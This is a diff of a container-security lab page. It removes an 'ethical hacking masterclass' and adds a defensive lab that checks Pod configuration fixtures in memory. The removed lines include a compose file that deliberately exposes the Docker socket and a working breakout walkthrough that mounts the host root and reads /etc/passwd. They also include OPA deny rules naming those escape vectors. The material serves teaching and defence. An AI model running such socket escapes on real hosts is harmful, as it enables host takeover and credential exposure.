@@ -1,459 +1,104 @@
-# Ethical Hacking & Applied Cloud Defense Masterclass
+# Ethical Hacker Practical Lab: Review Container Boundaries Before Deployment
 
-> [!IMPORTANT]
-> **Production Offensive & Defensive Security Lab | Masterclass Engineering Track**
-> **Audience:** Cloud Security Engineers, Penetration Testers, Red/Blue Team Operators, Platform Security Architects
-> **Standards & Frameworks:** MITRE ATT&CK for Cloud & Containers, NIST SP 800-115, PTES (Penetration Testing Execution Standard), OWASP Top 10
-> **Execution Environment:** Zero-cost local Docker sandbox (isolated container runtime with unprivileged escape testbeds)
-> **Rules of Engagement:** All offensive methodologies and exploits in this lab are intended strictly for educational defense validation and authorized penetration testing.
+Reviewed: 2026-11-06 · Intermediate · 45–60 minutes
 
----
+## Why this lab changed
 
-## 1. Enterprise Context & Applied Offensive Security
+Agent executors and build jobs often run untrusted or rapidly changing code. Their container configuration deserves the same review as an externally exposed service. This lab uses negative policy cases rather than host-breakout instructions.
 
-Offensive security (ethical hacking) is the rigorous, empirical practice of thinking and acting like a sophisticated adversary to validate whether defensive architectures and security controls withstand real-world attacks. Rather than relying on theoretical risk models or checkboxes on compliance audits, applied offensive testing proves exploitability and determines the true blast radius of potential compromises.
+The [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) define admission profiles. Our local fixture checks selected Linux Pod fields plus additional organization-policy examples. It is not a full implementation of the Restricted profile or proof of runtime isolation.
 
-In modern cloud and container environments, the perimeter has dissolved. Attackers exploit exposed API endpoints, CI/CD supply chains, or container misconfigurations to gain initial foothold, escalate privileges via Linux kernel namespaces or cloud IAM tokens, and move laterally across VPCs.
+## Prerequisites and scope
 
-### The 5-Phase Penetration Testing Lifecycle
+Python 3.10 or newer and the [workload-hardening source](/labs/examples/workload-hardening.py). No cluster, Docker daemon, privileged process, or host mount is needed. Every unsafe configuration remains an in-memory object and is never submitted to a runtime.
 
 ```mermaid
 flowchart LR
-      scope[Written scope and isolated lab targets] --> discovery[Reconnaissance and service inventory]
-      discovery --> validation[Validate exposures with bounded tests]
-      validation --> exploit[Demonstrate impact only inside approved scope]
-      exploit --> evidence[Record evidence and affected prerequisites]
-      evidence --> remediate[Remove dangerous mounts and tighten permissions]
-      remediate --> retest[Retest exploit path and normal application behavior]
+      scope[Define owned environment and workload contract] --> inventory[Inventory identities, images, mounts and network paths]
+      inventory --> fixtures[Create baseline and prohibited configuration fixtures]
+      fixtures --> review[Run local policy regressions without executing workloads]
+      review --> evidence[Record expected and observed failure reasons]
+      evidence --> admission[Extend to disposable cluster admission tests]
+      admission --> runtime[Verify allowed and denied runtime behavior]
 ```
 
----
+## Exercise 1: run the policy regression suite
 
-## 2. Architecture Blueprint & Attack Envelope
+```bash
+python3 public/labs/examples/workload-hardening.py
+```
 
-The blueprint below models a realistic cloud container environment under authorized penetration testing: an external attacker gaining ingress, compromising an unprivileged worker container, escaping via host filesystem mounts, and attacking internal datastores:
+For a downloaded copy, inspect the source and run `python3 workload-hardening.py`.
+
+Expect four passing tests. The baseline uses a synthetic digest-pinned image, non-root identity, a runtime-default seccomp profile, dropped capabilities, a read-only root filesystem, disabled automatic service-account token mounting, and CPU/memory limits.
+
+The `registry.example` image and repeated `a` digest are fixtures, not a downloadable workload. Replace them with an approved image and its real digest only when building an actual deployment.
 
 ```mermaid
 flowchart TB
-      tester[Authorized tester in isolated lab] -->|Approved test request| ingress[Lab application endpoint]
-      pod@{ icon: "logos:container-docker", label: "Intentionally vulnerable web container", h: 64 }
-      ingress --> pod
-      pod --> prerequisite{Host Docker socket exposed and usable?}
-      prerequisite -->|No| blocked[This breakout path is unavailable]
-      prerequisite -->|Yes| daemon[Host Docker daemon API]
-      daemon -->|If daemon permissions allow| host[Host filesystem exposure]
-      host --> scope[Impact limited by actual host and cloud permissions]
-      defense[Remove socket mount; restrict daemon access and container privileges] -.-> prerequisite
+      developer[Developer changes workload configuration] --> fixture[Local Pod configuration fixture]
+      fixture --> checks[Selected privilege, mount, identity and image checks]
+      checks -->|Prohibited fields| reject[Reject fixture; no workload starts]
+      checks -->|Selected checks pass| candidate[Candidate for environment verification]
+      runtime@{ icon: "logos:container-docker", label: "Actual runtime remains a separate test", h: 64 }
+      candidate -.-> runtime
+      note[Local checks do not implement full Kubernetes admission] -.-> checks
 ```
 
-### Container Breakout Execution Sequence
+## Exercise 2: detect a dangerous change before execution
+
+The negative case adds a host PID namespace, a Docker socket `hostPath`, and a privileged container. The checker returns three violations without launching the container. A separate case enables ambient credentials, a mutable image tag, and a writable root filesystem.
+
+Add regressions for an unsafe init container, an ephemeral debug container, an unconfined seccomp profile, and added capabilities. Include expected failure reasons so a test cannot pass merely because some unrelated validation failed.
 
 ```mermaid
 sequenceDiagram
       autonumber
-      actor Tester as Authorized lab tester
-      participant Container as Vulnerable lab container
-      participant Daemon as Host Docker daemon
-      participant Host as Lab host
-      participant Metadata as Optional metadata mock
-      Tester->>Container: Run approved exposure checks
-      Container->>Container: Inspect mount and socket access prerequisites
-      alt Socket absent or daemon denies access
-        Container-->>Tester: Breakout path blocked
-      else Socket is exposed to a privileged daemon
-        Container->>Daemon: Approved lab request demonstrating host mount exposure
-        Daemon->>Host: Expose filesystem according to daemon permissions
-        Host-->>Tester: Record scoped impact evidence
-        opt Metadata mock reachable and credentials exposed
-          Host->>Metadata: Test configured mock endpoint
-          Metadata-->>Host: Mock response, not proof of full cloud compromise
-        end
-      end
+      actor Tester as Lab author
+      participant Fixture as In-memory Pod specification
+      participant Policy as Local selected-field checker
+      Tester->>Fixture: Add privileged flag, host PID and hostPath
+      Fixture->>Policy: Review main and init container configuration
+      Policy-->>Tester: Report privilege, host namespace and mount violations
+      Tester->>Fixture: Restore baseline and add unsafe init container
+      Fixture->>Policy: Review all configured container types
+      Policy-->>Tester: Reject init-container bypass
+      Note over Tester,Policy: Fixtures are never submitted to a runtime
 ```
 
----
+## Exercise 3: plan admission and runtime verification separately
 
-## 3. Deep Technical Foundations
+| Layer | What to verify in a disposable cluster |
+| --- | --- |
+| Admission | Server rejects prohibited Pod fields |
+| Identity | Workload has only its required service-account permissions |
+| Filesystem | Writes are limited to declared scratch volumes |
+| Egress | Allowed destinations succeed and denied destinations fail |
+| Resource control | CPU, memory, task duration, and process limits behave as intended |
 
-### 1. Linux Container Isolation Mechanisms
-
-Containers are not virtual machines; they are standard Linux processes isolated by three kernel subsystems:
-- **Namespaces**: Partition system resources (PID, Mount, Net, IPC, UTS, User, Cgroup).
-- **Control Groups (cgroups)**: Enforce CPU, memory, and I/O resource limits.
-- **Seccomp & AppArmor/SELinux**: Filter system calls and restrict capability sets (`CAP_SYS_ADMIN`, `CAP_NET_RAW`).
-
-### 2. The Anatomy of Container Breakouts
-
-| Escape Vector | Underlying Misconfiguration | Exploitation Mechanism | Primary Architectural Remediation |
-|---|---|---|---|
-| **Docker Socket Mount** | Mounting `/var/run/docker.sock` inside container | Container talks to Docker API to create root container with `hostPath: /`. | Never mount Docker socket into pods; use Kaniko or rootless Buildah for builds. |
-| **`--privileged` Flag** | Container started with `--privileged` (bypasses AppArmor/Seccomp, drops no capabilities) | Attacker accesses `/dev/` block devices or writes to `/sys/fs/cgroup` release agents. | Enforce Kubernetes `Restricted` Pod Security Standards (PSS) via OPA Gatekeeper. |
-| **`hostPID: true`** | Container shares host process namespace | Attacker injects shellcode into host processes using `ptrace` or inspects host process memory. | Disallow `hostPID`, `hostNetwork`, and `hostIPC` in pod specs. |
-| **Mounted Sensitive Host Paths** | Mounting `/etc`, `/proc/sys`, or `/boot` | Attacker modifies crontabs or `/etc/shadow` on host. | Enforce read-only root filesystems and prohibit dangerous `hostPath` volumes. |
-
----
-
-## 4. Hands-on Laboratory Phases
-
-### Phase 1: Passive & Active OSINT Automation
-
-Modern reconnaissance combines certificate transparency logs, DNS enumeration, and HTTP header analysis:
-
-```bash
-# 1. Create dedicated offensive testing workspace
-mkdir -p ~/ethical-hacking-lab && cd ~/ethical-hacking-lab
-
-# 2. Author multi-source OSINT enumeration script
-cat << 'EOF' > osint_recon.sh
-#!/usr/bin/env bash
-set -euo pipefail
-
-TARGET_DOMAIN="${1:-example.com}"
-echo "============================================================"
-echo " Starting OSINT Reconnaissance for: $TARGET_DOMAIN"
-echo "============================================================"
-
-# Query Certificate Transparency (crt.sh) for registered subdomains
-echo "[+] Interrogating Certificate Transparency Logs via crt.sh..."
-curl -s "https://crt.sh/?q=%25.${TARGET_DOMAIN}&output=json" | \
-  python3 -c "
-import sys, json
-try:
-    data = json.load(sys.stdin)
-    subdomains = sorted(list(set(entry['name_value'] for entry in data)))
-    for s in subdomains[:15]:
-        print(f'    -> Discovered Subdomain: {s}')
-except Exception as e:
-    print('    [!] Rate-limited or no records found on crt.sh')
-" || true
-
-# Extract DNS Records (A, MX, TXT / SPF / DMARC)
-echo "[+] Enumerating DNS Configuration & Mail Security Records..."
-for record in A MX TXT; do
-  echo "  [Record: $record]"
-  dig +short "$record" "$TARGET_DOMAIN" | sed 's/^/    /'
-done
-
-echo "============================================================"
-echo " Reconnaissance Complete."
-EOF
-
-chmod +x osint_recon.sh
-./osint_recon.sh cloudseccorner.github.io
-```
-
-*Expected Terminal Output:*
-```text
-============================================================
- Starting OSINT Reconnaissance for: cloudseccorner.github.io
-============================================================
-[+] Interrogating Certificate Transparency Logs via crt.sh...
-    -> Discovered Subdomain: cloudseccorner.github.io
-[+] Enumerating DNS Configuration & Mail Security Records...
-  [Record: A]
-    185.199.108.153
-    185.199.109.153
-============================================================
- Reconnaissance Complete.
-```
-
----
-
-### Phase 2: Local Vulnerable Sandbox Deployment
-
-We instantiate an isolated Docker Compose environment simulating a compromised web container mounted with a Docker socket:
-
-```bash
-cat << 'EOF' > docker-compose.yml
-version: '3.8'
-
-services:
-  # Vulnerable web application container
-  vulnerable-pod:
-    image: alpine:3.19
-    container_name: lab-vulnerable-pod
-    volumes:
-      # Dangerous misconfiguration: exposing docker socket inside container
-      - /var/run/docker.sock:/var/run/docker.sock
-    command: >
-      sh -c "
-        apk add --no-cache curl docker-cli jq &&
-        echo 'Web worker daemon running on unprivileged container...' &&
-        tail -f /dev/null
-      "
-    networks:
-      lab-net:
-        ipv4_address: 172.29.0.5
-
-networks:
-  lab-net:
-    driver: bridge
-    ipam:
-      config:
-        - subnet: 172.29.0.0/24
-EOF
-
-# Deploy local sandbox
-docker compose up -d
-
-# Verify container status
-docker ps --filter "name=lab-vulnerable-pod"
-```
-
----
-
-### Phase 3: Container Breakout via Docker Socket Exploitation
-
-We simulate an attacker who has achieved remote code execution inside `vulnerable-pod` and demonstrates node breakout:
-
-```bash
-# 1. Exec into the compromised web container
-docker exec -it lab-vulnerable-pod sh -c "
-  echo '=== Inside Container Shell ==='
-  id
-  hostname
-
-  # 2. Check for docker socket access
-  if [ -S /var/run/docker.sock ]; then
-    echo '[!] CRITICAL: /var/run/docker.sock is accessible from inside container!'
-  fi
-
-  # 3. Query Docker API to prove access
-  curl -s --unix-socket /var/run/docker.sock http://localhost/version | jq '.Version'
-
-  # 4. Demonstrate Escape: Spawn escape container mounting host filesystem into /host
-  echo '[+] Spawning root container with full host mount...'
-  docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine:3.19 sh -c '
-    echo \"=== Host Filesystem Root Captured ===\"
-    head -n 5 /host/etc/passwd
-    echo \"Container escape successful: Node filesystem compromised.\"
-  '
-"
-```
-
-*Expected Terminal Output:*
-```text
-=== Inside Container Shell ===
-uid=0(root) gid=0(root)
-[!] CRITICAL: /var/run/docker.sock is accessible from inside container!
-"25.0.3"
-[+] Spawning root container with full host mount...
-=== Host Filesystem Root Captured ===
-root:x:0:0:root:/root:/bin/ash
-bin:x:1:1:bin:/bin:/sbin/nologin
-Container escape successful: Node filesystem compromised.
-```
-
----
-
-### Phase 4: Network Man-in-the-Middle & Dynamic ARP Inspection Defense
-
-In cloud environments with shared Layer 2 segments, attackers execute ARP poisoning to intercept unencrypted traffic:
+Read [Kubernetes NetworkPolicy guidance](https://kubernetes.io/docs/concepts/services-networking/network-policies/) before adding an egress test. Policies require a supporting network implementation; storing a policy object is not evidence of enforcement. Pod admission and network policy do not provide application-level authorization.
 
 ```mermaid
 sequenceDiagram
-      participant Tester as Authorized L2 lab tester
-      participant Gateway as Lab bridge gateway
-      participant Client as Lab client
-      Note over Tester,Client: Requires a shared L2 segment, not a universal cloud VPC behavior
-      Tester->>Gateway: Test ARP update claiming client IP
-      Tester->>Client: Test ARP update claiming gateway IP
-      alt Peers accept updates and forwarding is configured
-        Client->>Tester: Traffic sent to substituted MAC
-        Tester->>Gateway: Forward packet to maintain connectivity
-        Note over Tester,Client: Properly validated TLS still protects application payloads
-      else Bindings or L2 protections reject changes
-        Client->>Gateway: Continue using legitimate neighbor binding
-      end
-      Note over Tester,Gateway: Restore neighbor state and verify connectivity after the test
+      participant Tester as Authorized cluster owner
+      participant API as Kubernetes API and admission
+      participant CNI as Supporting network implementation
+      participant Pod as Disposable workload
+      Tester->>API: Submit configured admission test in owned namespace
+      API-->>Tester: Reject prohibited Pod or admit approved Pod
+      Tester->>CNI: Configure and verify supported network policy
+      Tester->>Pod: Test allowed destination and denied destination
+      Pod-->>Tester: Record actual reachability and identity evidence
+      Note over Tester,Pod: Production extension, not executed by local fixture
+      Tester->>API: Remove owned test workloads and namespace
 ```
 
-#### Defending Against ARP Spoofing:
-1. **Dynamic ARP Inspection (DAI)**: Switches validate ARP packets against DHCP Snooping binding tables.
-2. **Static ARP Binding**: For critical static infrastructure, lock gateway MAC addresses:
-```bash
-# Enforce static ARP binding on Linux hosts
-ip neigh replace 172.29.0.1 lladdr 00:11:22:33:44:55 nud permanent dev eth0
-```
+## Expected evidence and acceptance criteria
 
----
+Save the four passing tests, the selected organization controls, and an explicit list of controls this checker does not evaluate. The baseline must pass; privileged/host access, ambient tokens, mutable images, and an unsafe init container must fail.
 
-### Phase 5: Automated Remediation & Verification Script
+Before using a real cluster, record its owner, context, namespace, approved image digest, and cleanup plan. Use server-side validation and admission evidence in that environment. This local fixture neither creates an admission policy nor evaluates all Kubernetes schema, OS, volume, port, and security-context requirements.
 
-We author an automated bash verification script that audits container security postures and verifies that dangerous mounts are neutralized:
+## Cleanup and next steps
 
-```bash
-cat << 'EOF' > audit_container_security.sh
-#!/usr/bin/env bash
-set -euo pipefail
-
-CONTAINER_NAME="lab-vulnerable-pod"
-
-echo "============================================================"
-echo " Auditing Container Hardening & Escape Surface: $CONTAINER_NAME"
-echo "============================================================"
-
-# Check 1: Audit for docker socket mount
-SOCKET_MOUNT=$(docker inspect "$CONTAINER_NAME" | jq -r '.[0].Mounts[] | select(.Destination == "/var/run/docker.sock") | .Destination')
-if [ -n "$SOCKET_MOUNT" ]; then
-  echo "  [FAIL] DANGEROUS MOUNT DETECTED: $SOCKET_MOUNT is mounted into container."
-else
-  echo "  [PASS] No Docker socket mounts detected."
-fi
-
-# Check 2: Audit for Privileged Flag
-IS_PRIVILEGED=$(docker inspect "$CONTAINER_NAME" | jq -r '.[0].HostConfig.Privileged')
-if [ "$IS_PRIVILEGED" = "true" ]; then
-  echo "  [FAIL] Container runs with --privileged=true."
-else
-  echo "  [PASS] Container does NOT run in privileged mode."
-fi
-
-# Check 3: Audit for hostPID
-HOST_PID=$(docker inspect "$CONTAINER_NAME" | jq -r '.[0].HostConfig.PidMode')
-if [ "$HOST_PID" = "host" ]; then
-  echo "  [FAIL] Container shares host PID namespace."
-else
-  echo "  [PASS] Container PID namespace is isolated."
-fi
-
-echo "============================================================"
-EOF
-
-chmod +x audit_container_security.sh
-./audit_container_security.sh
-```
-
-*Expected Terminal Output:*
-```text
-============================================================
- Auditing Container Hardening & Escape Surface: lab-vulnerable-pod
-============================================================
-  [FAIL] DANGEROUS MOUNT DETECTED: /var/run/docker.sock is mounted into container.
-  [PASS] Container does NOT run in privileged mode.
-  [PASS] Container PID namespace is isolated.
-============================================================
-```
-
----
-
-## 5. Policy as Code & Defensive Automation
-
-To deterministically block container breakouts in Kubernetes and container runtimes, we author an Open Policy Agent (OPA) Rego policy enforcing Kubernetes Pod Security Standards:
-
-```bash
-cat << 'EOF' > k8s_pod_security.rego
-package cloudsec.k8s.admission
-
-default allow = false
-
-# Rule 1: Deny containers that mount /var/run/docker.sock
-deny[msg] {
-    some i, j
-    volume := input.request.object.spec.volumes[i]
-    volume.hostPath.path == "/var/run/docker.sock"
-    msg := sprintf("Pod '%v' is REJECTED: Mounting /var/run/docker.sock is prohibited.", [input.request.object.metadata.name])
-}
-
-# Rule 2: Deny privileged containers
-deny[msg] {
-    some i
-    container := input.request.object.spec.containers[i]
-    container.securityContext.privileged == true
-    msg := sprintf("Container '%v' in Pod '%v' is REJECTED: privileged mode is prohibited.", [container.name, input.request.object.metadata.name])
-}
-
-# Rule 3: Deny hostPID and hostNetwork
-deny[msg] {
-    input.request.object.spec.hostPID == true
-    msg := sprintf("Pod '%v' is REJECTED: hostPID must be false.", [input.request.object.metadata.name])
-}
-
-# Allow if zero violations exist
-allow {
-    count(deny) == 0
-}
-EOF
-```
-
-#### Verification of OPA Policy via Python Test Runner
-
-```bash
-cat << 'EOF' > test_opa_k8s.py
-import json
-
-pod_request = {
-    "request": {
-        "object": {
-            "metadata": {"name": "payment-api"},
-            "spec": {
-                "hostPID": False,
-                "volumes": [
-                    {"name": "docker-sock", "hostPath": {"path": "/var/run/docker.sock"}}
-                ],
-                "containers": [
-                    {"name": "worker", "securityContext": {"privileged": True}}
-                ]
-            }
-        }
-    }
-}
-
-print("Evaluating OPA Kubernetes Admission Guardrail:")
-denials = []
-
-spec = pod_request["request"]["object"]["spec"]
-pod_name = pod_request["request"]["object"]["metadata"]["name"]
-
-# Rule 1
-for v in spec.get("volumes", []):
-    if v.get("hostPath", {}).get("path") == "/var/run/docker.sock":
-        denials.append(f"Pod '{pod_name}' is REJECTED: Mounting /var/run/docker.sock is prohibited.")
-
-# Rule 2
-for c in spec.get("containers", []):
-    if c.get("securityContext", {}).get("privileged"):
-        denials.append(f"Container '{c['name']}' in Pod '{pod_name}' is REJECTED: privileged mode is prohibited.")
-
-# Rule 3
-if spec.get("hostPID"):
-    denials.append(f"Pod '{pod_name}' is REJECTED: hostPID must be false.")
-
-for d in denials:
-    print(f"  [X] {d}")
-
-assert len(denials) == 2, "Expected exactly 2 admission rejections"
-print("\n[OK] OPA Gatekeeper policy successfully blocked container breakout vectors.")
-EOF
-
-python3 test_opa_k8s.py
-```
-
-*Expected Terminal Output:*
-```text
-Evaluating OPA Kubernetes Admission Guardrail:
-  [X] Pod 'payment-api' is REJECTED: Mounting /var/run/docker.sock is prohibited.
-  [X] Container 'worker' in Pod 'payment-api' is REJECTED: privileged mode is prohibited.
-
-[OK] OPA Gatekeeper policy successfully blocked container breakout vectors.
-```
-
----
-
-## 6. Hardening Checklist & Verification Matrix
-
-| Vulnerability Vector | Framework / MITRE | Hardening Standard | Verification Method |
-|---|---|---|---|
-| **Docker Socket Escape** | MITRE ATT&CK T1611 | Prohibit mounting `/var/run/docker.sock` | `docker inspect <container> \| jq .[].Mounts` |
-| **Privileged Containers** | NIST SP 800-190 | `securityContext.privileged: false` | OPA Gatekeeper admission controller |
-| **Host Namespace Sharing** | CIS K8s Benchmark 5.2.2 | `hostPID: false`, `hostNetwork: false` | Pod spec audit |
-| **Read-Only Root Filesystem** | CIS K8s Benchmark 5.2.6 | `readOnlyRootFilesystem: true` | Ephemeral `emptyDir` mounts for write needs |
-| **Dropped Capabilities** | Linux Hardening | `drop: ["ALL"]`, add minimal capabilities | `capsh --print` inside container |
-
-### Post-Lab Cleanup
-
-```bash
-# Tear down lab containers
-cd ~/ethical-hacking-lab && docker compose down -v
-rm -rf ~/ethical-hacking-lab
-```
+The exercise writes no files, makes no network calls, and creates no workloads. Delete only your downloaded copy when finished. Continue with [the workload-isolation field note](/blog/Kubernetes-Agent-Isolation-2026), [workload identity](/labs/Zero-Trust-Architecture), and [artifact verification](/labs/Security-Engineering-Fundamentals) to connect configuration review with identity and release evidence.
